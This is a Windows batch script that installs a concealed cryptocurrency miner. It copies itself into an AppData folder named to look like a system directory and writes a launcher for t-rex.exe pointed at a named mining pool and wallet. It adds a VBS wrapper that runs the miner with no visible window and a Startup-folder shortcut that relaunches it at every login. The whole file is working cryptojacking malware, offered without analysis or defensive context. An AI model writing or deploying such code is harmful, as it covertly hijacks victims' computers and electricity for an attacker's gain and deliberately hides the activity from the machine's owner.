@echo off
setlocal

:: Define script and folder paths
set "WORKING_DIR=%APPDATA%\WindowsSystem"
set "MINER_SCRIPT=%WORKING_DIR%\miner.bat"
set "VBS_SCRIPT=%WORKING_DIR%\run_hidden.vbs"
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"

:: Create necessary directories
mkdir "%WORKING_DIR%" 2>nul

:: Copy all miner files to a persistent location
xcopy "%~dp0*" "%WORKING_DIR%\" /Y /E /I

:: Write miner script
(
echo @echo off
echo cd /d "%WORKING_DIR%"
echo :loop
echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
echo start /b t-rex.exe -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
) > "%MINER_SCRIPT%"

:: Write VBS script to run miner in hidden mode
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run """%MINER_SCRIPT%""", 0, False
) > "%VBS_SCRIPT%"

:: Create a shortcut in the Startup folder
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"

:: Run miner immediately
wscript "%VBS_SCRIPT%"

exit
